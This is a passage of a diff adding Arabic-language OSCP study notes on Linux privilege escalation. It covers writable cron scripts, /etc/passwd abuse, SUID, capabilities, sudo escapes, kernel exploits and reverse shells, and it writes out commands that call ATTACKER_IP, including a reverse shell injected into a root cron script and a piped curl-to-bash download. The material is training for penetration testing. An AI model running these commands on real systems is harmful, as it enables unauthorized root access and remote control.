+<svg viewBox="0 0 700 100" xmlns="http://www.w3.org/2000/svg">
+  <rect x="8"   y="20" width="110" height="55" rx="6" class="dsvg-box-a"/>
+  <text x="63"  y="43" text-anchor="middle" class="dsvg-amber" font-size="10" font-weight="700">/etc/crontab</text>
+  <text x="63"  y="60" text-anchor="middle" class="dsvg-muted" font-size="9">* * * * * root</text>
+  <text x="63"  y="72" text-anchor="middle" class="dsvg-muted" font-size="9">/home/joe/backup.sh</text>
+  <line x1="118" y1="47" x2="138" y2="47" class="dsvg-line"/>
+  <polygon points="138,42 148,47 138,52" class="dsvg-arr"/>
+  <rect x="148" y="20" width="120" height="55" rx="6" class="dsvg-box-r"/>
+  <text x="208" y="43" text-anchor="middle" class="dsvg-red"   font-size="10" font-weight="700">backup.sh</text>
+  <text x="208" y="60" text-anchor="middle" class="dsvg-red"   font-size="9">-rwxrwxrw-</text>
+  <text x="208" y="72" text-anchor="middle" class="dsvg-muted" font-size="9">world-writable!</text>
+  <line x1="268" y1="47" x2="288" y2="47" class="dsvg-line"/>
+  <polygon points="288,42 298,47 288,52" class="dsvg-arr"/>
+  <rect x="298" y="20" width="130" height="55" rx="6" class="dsvg-box-b"/>
+  <text x="363" y="43" text-anchor="middle" class="dsvg-blue"  font-size="10" font-weight="700">Inject Payload</text>
+  <text x="363" y="60" text-anchor="middle" class="dsvg-muted" font-size="9">bash reverse shell</text>
+  <text x="363" y="72" text-anchor="middle" class="dsvg-muted" font-size="9">appended to script</text>
+  <line x1="428" y1="47" x2="448" y2="47" class="dsvg-line"/>
+  <polygon points="448,42 458,47 448,52" class="dsvg-arr"/>
+  <rect x="458" y="20" width="110" height="55" rx="6" class="dsvg-box-p"/>
+  <text x="513" y="43" text-anchor="middle" font-size="10" font-weight="700" style="fill:var(--purple)">nc -lvnp 4444</text>
+  <text x="513" y="60" text-anchor="middle" class="dsvg-muted" font-size="9">Listener ready</text>
+  <line x1="568" y1="47" x2="588" y2="47" class="dsvg-line-g"/>
+  <polygon points="588,42 598,47 588,52" class="dsvg-arr-g"/>
+  <rect x="598" y="14" width="94" height="67" rx="6" class="dsvg-box-r" style="stroke-width:2;"/>
+  <text x="645" y="42" text-anchor="middle" class="dsvg-red"   font-size="12" font-weight="700">root</text>
+  <text x="645" y="60" text-anchor="middle" class="dsvg-red"   font-size="9">Shell ✓</text>
+  <text x="645" y="73" text-anchor="middle" class="dsvg-muted" font-size="8">&lt; 1 دقيقة</text>
+</svg>
+<div class="diagram-caption">Cron بيشتغل كل دقيقة → Script مُعدَّل → Reverse Shell كـ root في أقل من دقيقة</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash — cron exploitation</span><pre><code># 1. فحص الـ Crontab
+cat /etc/crontab
+# * * * * * root /home/joe/backup.sh
+
+# 2. التحقق من الصلاحيات
+ls -la /home/joe/backup.sh
+# -rwxrwxrw- 1 root root backup.sh  ← world-writable!
+
+# 3. حقن Reverse Shell
+echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /home/joe/backup.sh
+
+# 4. تشغيل Listener على جهاز المهاجم
+nc -lvnp 4444
+
+# 5. انتظار أقل من دقيقة → root shell تصل
+# whoami → root
+</code></pre></div>
+
+<h3>/etc/passwd — استغلال الكتابة العالمية</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ /etc/passwd</div>
+<p>بيخزَّن معلومات حسابات المستخدمين — قابل للقراءة من الجميع لأسباب التوافق. النظام الحديث بيخزَّن الهاشات في <code>/etc/shadow</code> — لكن Linux ما زال يدعم الهاشات في <code>/etc/passwd</code> للتوافق العكسي. لو الملف قابل للكتابة → ثغرة حرجة.</p>
+</div>
+<p>صيغة الإدخال: <code>username:password:UID:GID:comment:home:shell</code></p>
+<p>المهاجم ممكن يُضيف إدخالاً بـ <code>UID=0</code> (معاملته بالظبط زي root من الـ OS) مع هاش كلمة مرور معروف — بدون الحاجة لأي exploit.</p>
+
+<div class="code-wrap"><span class="code-tag">bash — /etc/passwd abuse</span><pre><code># 1. التحقق إن /etc/passwd قابل للكتابة
+ls -la /etc/passwd
+# -rw-rw-rw- 1 root root /etc/passwd  ← world-writable!
+
+# 2. توليد هاش كلمة المرور
+openssl passwd -1 -salt hacker mypassword
+# → $1$hacker$xxxxxxxxxxxxxxxxxxxx
+
+# أو بدون Salt
+openssl passwd mypassword
+
+# 3. إضافة حساب جديد بـ UID=0
+echo 'root2:$1$hacker$xxxxxxxxxxxxxxxxxxxx:0:0:root2:/root:/bin/bash' >> /etc/passwd
+
+# 4. التبديل للحساب الجديد
+su root2
+# Password: mypassword
+
+# 5. التحقق
+id
+# uid=0(root2) gid=0(root) groups=0(root)
+</code></pre></div>
+
+<div class="callout examtip">
+<div class="callout-label">★ Quick Win</div>
+<p>لو <code>/etc/passwd</code> world-writable — هذا واحد من أسرع مسارات الـ root على الإطلاق. لا Exploit، لا Compilation، لا انتظار — فقط إضافة سطر واحد. دايماً تحقَّق من صلاحياته في بداية التعداد.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU4 -->
+<h2 id="lu4"><span class="num">04</span><span class="htext">SUID وLinux Capabilities وSudo</span></h2>
+
+<h3>SUID — Set-User-ID</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ SUID Bit</div>
+<p>عادةً، العملية بتشتغل بـ UID المستخدم اللي شغَّلها. لما SUID bit مُعيَّن، البرنامج بيشتغل بصلاحيات <strong>مالك الملف</strong> — مش المستخدم الحالي. لما تلاقي SUID binary مملوك لـ root وبيسمح بتنفيذ أوامر → أي أمر بيشتغل كـ root. ابحث عن <code>s</code> في الصلاحيات: <code>-rwsr-xr-x</code></p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash — suid exploitation</span><pre><code># البحث عن كل SUID binaries
+find / -perm -u=s -type f 2>/dev/null
+# → /usr/bin/find  ← الهدف!
+# → /usr/bin/passwd  ← شرعي (لتغيير كلمة المرور)
+# → /usr/bin/python3  ← خطير!
+
+# التحقق من الـ SUID flag
+ls -la /usr/bin/find
+# -rwsr-xr-x 1 root root /usr/bin/find
+
+# استغلال find (يسمح بتنفيذ أوامر عبر -exec)
+find . -exec /bin/sh -p \; -quit
+
+# التحقق من النتيجة
+id
+# uid=1000(joe) euid=0(root)  ← effective UID = root!
+
+# أو بطريقة أخرى
+find . -exec whoami \;
+# → root
+</code></pre></div>
+
+<div class="callout tip">
+<div class="callout-label">✓ GTFOBins — مرجعك الأساسي</div>
+<p><strong>gtfobins.github.io</strong> — قاعدة بيانات شاملة لتقنيات استغلال مئات الـ Binaries عبر SUID وSudo والـ Capabilities وغيرها. لما تجد SUID binary، ابحث فيه فوراً.</p>
+</div>
+
+<h3>Linux Capabilities</h3>
+<p>الـ Capabilities بتقسَّم امتيازات root لصلاحيات أصغر ومحدَّدة يمكن منحها لـ Binary معيّن — دون منحه root كامل. أكثر Capability خطرة: <strong>cap_setuid</strong> — تسمح للـ Binary بتغيير UID الخاص به لـ 0 (root).</p>
+
+<div class="code-wrap"><span class="code-tag">bash — capabilities exploitation</span><pre><code># البحث عن كل binaries لها Capabilities
+getcap -r / 2>/dev/null
+# → /usr/bin/python3 = cap_setuid+ep  ← خطير!
+# → /usr/bin/perl    = cap_setuid+ep
+# → /usr/bin/ruby    = cap_setuid+ep
+
+# استغلال cap_setuid عبر Python
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+# → root shell فوري
+
+# نفس الأسلوب مع Perl
+perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
+
+# مع Ruby
+ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
+</code></pre></div>
+
+<div class="callout examtip">
+<div class="callout-label">★ أي Interpreter بـ cap_setuid = root فوري</div>
+<p>python3، perl، ruby، node، php — أي منها بـ <code>cap_setuid+ep</code> بيدّيك root بسطر واحد. <code>getcap -r / 2>/dev/null</code> واحد من أهم الأوامر في التعداد.</p>
+</div>
+
+<h3>Sudo — الاستغلال عبر البرامج المسموح بها</h3>
+<p>sudo بيسمح للمستخدمين المرخَّصين بتشغيل أوامر كـ root بدون تسجيل الدخول كـ root. القواعد في <code>/etc/sudoers</code>. أهم أمر في الـ PrivEsc على Linux:</p>
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code>sudo -l</code></pre></div>
+
+<h3>ما تبحث عنه في sudo -l</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>ما تراه</th><th>المعنى</th><th>مسار الاستغلال</th></tr></thead>
+<tbody>
+<tr><td><code>NOPASSWD: /usr/bin/vim</code></td><td>vim بدون كلمة مرور</td><td><code>sudo vim -c ':!/bin/bash'</code></td></tr>
+<tr><td><code>NOPASSWD: /usr/bin/find</code></td><td>find بدون كلمة مرور</td><td><code>sudo find . -exec /bin/sh \;</code></td></tr>
+<tr><td><code>NOPASSWD: /usr/bin/python3</code></td><td>python بدون كلمة مرور</td><td><code>sudo python3 -c 'import os; os.system("/bin/bash")'</code></td></tr>
+<tr><td><code>NOPASSWD: /usr/bin/apt-get</code></td><td>apt-get بدون كلمة مرور</td><td>Changelog pager → <code>!/bin/bash</code></td></tr>
+<tr><td><code>NOPASSWD: /usr/bin/less</code></td><td>less بدون كلمة مرور</td><td><code>sudo less /etc/passwd</code> → <code>!/bin/bash</code></td></tr>
+<tr><td><code>NOPASSWD: ALL</code></td><td>كل الأوامر بدون كلمة مرور</td><td><code>sudo /bin/bash</code> مباشرة</td></tr>
+</tbody>
+</table></div>
+
+<div class="code-wrap"><span class="code-tag">bash — sudo exploitation examples</span><pre><code># فحص sudo permissions
+sudo -l
+# → (root) NOPASSWD: /usr/bin/apt-get
+
+# مثال apt-get — يفتح Pager (less) عند changelog
+sudo apt-get changelog apt
+# داخل الـ Pager، اكتب:
+!/bin/bash
+# → root shell
+
+# مثال vim
+sudo vim -c ':!/bin/bash'
+
+# مثال less
+sudo less /etc/passwd
+!/bin/bash
+
+# مثال awk
+sudo awk 'BEGIN {system("/bin/bash")}'
+
+# مثال نمطي: أي أداة تفتح shell
+# راجع gtfobins.github.io للقائمة الكاملة
+</code></pre></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU5 -->
+<h2 id="lu5"><span class="num">05</span><span class="htext">Kernel Vulnerabilities</span></h2>
+
+<h3>ليه Kernel Exploits قوية وخطيرة في نفس الوقت</h3>
+<p>الـ Kernel بيتحكَّم في كل العمليات منخفضة المستوى — Kernel Exploit ممكن يتجاوز كل ضوابط الأمان ويمنح root مباشرة. لكنه الأخطر: Exploit خاطئ أو غير متوافق ممكن يعمل Kernel Panic (Crash) للنظام.</p>
+
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">!</span><span><strong>إصدار الـ Kernel الدقيق</strong> — <code>uname -r</code> لازم يتطابق تماماً</span></div>
+  <div class="goal-card"><span class="gi">!</span><span><strong>التوزيعة والـ Codename</strong> — Ubuntu vs Debian vs CentOS مهمة</span></div>
+  <div class="goal-card"><span class="gi">!</span><span><strong>المعمارية</strong> — x86_64 vs ARM vs i386 — exploit للمعمارية الغلط = Crash</span></div>
+</div>
+
+<h3>خطوات Kernel Exploit — من البداية للنهاية</h3>
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">جمع معلومات النظام الدقيقة</div>
+<div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code>cat /etc/issue && uname -r && arch
+# → Ubuntu 16.04 | 4.4.0-116-generic | x86_64
+</code></pre></div>
+</div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">البحث عن Exploits المناسبة</div>
+<div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># searchsploit على الـ Kali
+searchsploit linux kernel 4.4 local privilege escalation
+searchsploit "ubuntu 16.04" local
+
+# أدوات Automated Suggester
+# Windows Exploit Suggester - Next Gen (wes.py)
+python wes.py --update
+python wes.py sysinfo.txt -i 'Privilege Escalation'
+</code></pre></div>
+</div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">مراجعة الـ Exploit Source Code</div>
+<div class="step-body"><p>اقرأ الكود — افهم flags التجميع، تعليمات الاستخدام، والشروط المطلوبة. بعض الـ Exploits تحتاج حالات خاصة أو إصدارات محدَّدة من المكتبات.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">نقل الـ Source وتجميعه على الهدف</div>
+<div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># نقل الـ Source للهدف
+# (wget, curl, scp, python http.server, nc...)
+wget http://ATTACKER_IP/exploit.c
+
+# تجميع على الهدف مباشرة (الأفضل — يضمن التوافق)
+gcc exploit.c -o exploit
+
+# التحقق من الناتج
+file exploit
+# → ELF 64-bit LSB executable, x86-64
+</code></pre></div>
+</div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">تنفيذ الـ Exploit</div>
+<div class="step-body">
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code>chmod +x exploit
+./exploit
+
+# لو نجح:
+id
+# uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div>
+</div>
+</div>
+<div class="step-item">
+<div class="step-num">6</div>
+<div class="step-title">التحقق والتوثيق</div>
+<div class="step-body"><p>تأكّد إن <code>id</code> بيُظهر <code>uid=0</code>. وثَّق النتيجة. أعِد النظام لحالته المستقرة لو أمكن — Kernel Exploits بعضها بتعدَّل Kernel Memory وممكن تسبَّب عدم استقرار.</p></div>
+</div>
+</div>
+
+<div class="callout danger">
+<div class="callout-label">⚡ Kernel Exploits = Last Resort</div>
+<p>Kernel Exploit فاشل ممكن يوقع النظام — هذا يعني <strong>فقدان الوصول الكامل</strong> وإنذار فوري للفريق الدفاعي. دايماً جرَّب في Lab مطابق أولاً. استخدمه <strong>فقط</strong> لو كل الأساليب الأخرى فشلت.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ CHEAT SHEET -->
+<h2 id="cheat"><span class="htext">Cheat Sheet مرجعي</span></h2>
+<div class="cheat-section">
+
+<h4>Quick Wins — من الأسرع للأبطأ</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>#</th><th>الفحص</th><th>الأمر</th><th>المسار</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>sudo -l: NOPASSWD entries؟</td><td><code>sudo -l</code></td><td>GTFOBins → root shell</td></tr>
+<tr><td>2</td><td>/etc/passwd world-writable؟</td><td><code>ls -la /etc/passwd</code></td><td>إضافة UID=0 account</td></tr>
+<tr><td>3</td><td>cap_setuid على interpreter؟</td><td><code>getcap -r / 2>/dev/null</code></td><td><code>os.setuid(0)</code> → bash</td></tr>
+<tr><td>4</td><td>Cron script قابل للكتابة؟</td><td><code>cat /etc/crontab</code> + <code>ls -la</code></td><td>حقن Reverse Shell</td></tr>
+<tr><td>5</td><td>SUID binary خطير؟</td><td><code>find / -perm -u=s -type f 2>/dev/null</code></td><td>GTFOBins → root shell</td></tr>
+<tr><td>6</td><td>Credential في History/Env؟</td><td><code>cat ~/.bash_history && env</code></td><td>إعادة استخدام → su/ssh</td></tr>
+<tr><td>7</td><td>/etc/shadow قابل للقراءة؟</td><td><code>ls -la /etc/shadow</code></td><td>Hashcat → كسر كلمة مرور root</td></tr>
+<tr><td>8</td><td>Kernel إصدار قديم؟</td><td><code>uname -r</code> + searchsploit</td><td>Kernel Exploit (آخر حل)</td></tr>
+</tbody>
+</table></div>
+
+<h4>التعداد الكامل — أوامر سريعة</h4>
+<div class="code-wrap"><span class="code-tag">bash — full enum checklist</span><pre><code># الهوية الكاملة
+id && whoami && groups
+
+# معلومات النظام
+cat /etc/issue; uname -a; arch
+
+# المستخدمون والـ Shadow
+cat /etc/passwd | grep -v nologin
+ls -la /etc/shadow    # هل قابل للقراءة؟
+ls -la /etc/passwd    # هل قابل للكتابة؟
+
+# Sudo
+sudo -l
+
+# SUID
+find / -perm -u=s -type f 2>/dev/null
+
+# Capabilities
+getcap -r / 2>/dev/null
+
+# Cron
+cat /etc/crontab; ls /etc/cron*
+
+# Writable files (مهم)
+find / -writable -type f -not -path "/proc/*" 2>/dev/null
+
+# History & Env
+cat ~/.bash_history; env; cat ~/.bashrc
+
+# الشبكة
+ip a; ss -tulpn
+
+# العمليات
+ps aux | grep root
+
+# LinPEAS (بعد الأوامر اليدوية)
+./linpeas.sh | tee /tmp/linpeas_output.txt
+</code></pre></div>
+
+<h4>أبرز Binaries على GTFOBins للـ SUID/Sudo</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>Binary</th><th>SUID Shell Escape</th><th>Sudo Shell Escape</th></tr></thead>
+<tbody>
+<tr><td><code>find</code></td><td><code>find . -exec /bin/sh -p \; -quit</code></td><td><code>sudo find . -exec /bin/sh \;</code></td></tr>
+<tr><td><code>vim</code></td><td><code>vim -c ':py import os; os.execl("/bin/sh","sh","-p")'</code></td><td><code>sudo vim -c ':!/bin/bash'</code></td></tr>
+<tr><td><code>python3</code></td><td><code>python3 -c 'import os;os.execl("/bin/sh","sh","-p")'</code></td><td><code>sudo python3 -c 'import os;os.system("/bin/bash")'</code></td></tr>
+<tr><td><code>less</code></td><td>—</td><td><code>sudo less /etc/passwd</code> → <code>!/bin/bash</code></td></tr>
+<tr><td><code>awk</code></td><td><code>awk 'BEGIN{system("/bin/sh -p")}'</code></td><td><code>sudo awk 'BEGIN{system("/bin/bash")}'</code></td></tr>
+<tr><td><code>perl</code></td><td><code>perl -e 'exec "/bin/sh -p";'</code></td><td><code>sudo perl -e 'exec "/bin/bash";'</code></td></tr>
+<tr><td><code>nmap</code></td><td><code>nmap --interactive</code> → <code>!sh</code></td><td><code>sudo nmap --interactive</code> → <code>!sh</code></td></tr>
+<tr><td><code>cp</code></td><td>نسخ /bin/bash → SUID</td><td>نسخ /etc/passwd / /etc/shadow</td></tr>
+</tbody>
+</table></div>
+
+<h4>نقل الملفات للهدف — خيارات سريعة</h4>
+<div class="code-wrap"><span class="code-tag">bash — file transfer</span><pre><code># على الـ Attacker: HTTP Server
+python3 -m http.server 8080
+
+# على الهدف: تنزيل الملف
+wget http://ATTACKER_IP:8080/linpeas.sh
+curl -o linpeas.sh http://ATTACKER_IP:8080/linpeas.sh
+
+# بديل: نقل عبر nc
+# Attacker: nc -lvnp 4444 < exploit.c
+# Target:   nc ATTACKER_IP 4444 > exploit.c
+
+# تنفيذ LinPEAS مباشرة بدون حفظ
+curl http://ATTACKER_IP:8080/linpeas.sh | bash
+</code></pre></div>
+
+<h4>إنشاء Reverse Shell</h4>
+<div class="code-wrap"><span class="code-tag">bash — reverse shells</span><pre><code># Bash Reverse Shell
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+# Python Reverse Shell
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
+
+# Listener على Attacker
+nc -lvnp 4444
+
+# Upgrade Shell (بعد الاتصال)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z → stty raw -echo; fg
+</code></pre></div>
+
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ SUMMARY -->
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>الموديول ده بنى منهجية شاملة لرفع الامتيازات على Linux — من فهم نموذج الصلاحيات الأساسي، لصيد بيانات الاعتماد من آثار المستخدمين، واستغلال الإعدادات الخاطئة في Cron وملفات النظام، وصولاً لتقنيات SUID وCapabilities وSudo والـ Kernel.</p>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./module15_summary.txt</div>
+<ul>
+<li>نموذج الصلاحيات (rwx على Owner/Group/Others) هو أساس تحليل كل مسارات الترقية على Linux</li>
+<li>التعداد اليدوي (id, ps aux, cron, find) يكتشف Misconfigs تفوَّتها الأدوات الآلية</li>
+<li>آثار المستخدمين (.bash_history, env variables) كثيراً ما تحتوي Passwords بنص واضح</li>
+<li>مراقبة العمليات (watch loop) يمكن اصطياد كلمات المرور التي تُمرَّر في Command Line</li>
+<li>Cron Script قابل للكتابة يشتغل كـ root = ترقية فورية في أقل من دقيقة</li>
+<li>/etc/passwd world-writable = إضافة UID=0 account بدون أي exploit</li>
+<li>SUID binaries وcap_setuid على Interpreters = root shell بسطر واحد عبر GTFOBins</li>
+<li>sudo -l دايماً أول أمر بعد id — NOPASSWD entries هي الأسرع للـ root</li>
+<li>Kernel Exploits آخر الحلول — تتطلب تطابقاً دقيقاً وتجرِّب في Lab أولاً</li>
+<li>LinPEAS مُسرِّعة ممتازة لكنها مش كاملة — دمجها مع التعداد اليدوي إلزامي</li>
+</ul>
+</div>
+
+<blockquote>
+<p><strong>Linux PrivEsc منهجية، مش حظ.</strong> ابدأ بـ Quick Wins (sudo -l, /etc/passwd, getcap) → فحص SUID وCron → صيد Credentials من الآثار → Kernel كآخر ملاذ. الصبر والتعداد المنهجي يُفضي للـ root في كل مرة.</p>
+</blockquote>
+
+<div class="callout examtip">
+<div class="callout-label">★ Professional Mindset</div>
+<p>ترتيب الفحوص في الـ Engagement الحقيقي: <code>sudo -l</code> → <code>getcap -r /</code> → <code>ls -la /etc/passwd /etc/shadow</code> → <code>cat /etc/crontab</code> → <code>find / -perm -u=s</code> → <code>cat ~/.bash_history && env</code> → LinPEAS → Kernel. كل خطوة فاشلة ترشدك للتالية. وثَّق كل شيء.</p>
+</div>
+
+<hr />
+<p><em>نهاية نوتس الموديول الخامس عشر — OSCP: Linux Privilege Escalation</em></p>
+<div class="footer-note">-- EOF: module-15/linux-privesc.md --</div>
+
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement,btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement,s=h.scrollTop,ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');s>500?t.classList.add('show'):t.classList.remove('show');}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var c=wrap.querySelector('code');if(!c)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){if(navigator.clipboard){navigator.clipboard.writeText(c.innerText).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}});
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
